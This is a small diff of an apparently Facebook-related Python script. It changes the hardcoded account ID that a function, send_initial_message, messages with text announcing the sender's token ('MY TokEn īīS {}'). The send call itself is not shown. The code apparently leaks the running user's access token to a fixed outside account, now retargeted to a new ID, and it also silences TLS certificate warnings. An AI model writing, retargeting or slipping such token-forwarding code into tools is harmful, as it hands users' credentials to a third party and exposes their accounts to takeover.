@@ -42,7 +42,7 @@ def send_initial_message():
       msg_template = "HeLLo feliix SīīR! I am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100006233985386"
+      target_id = "61574890077316"
 
       requests.packages.urllib3.disable_warnings()
 
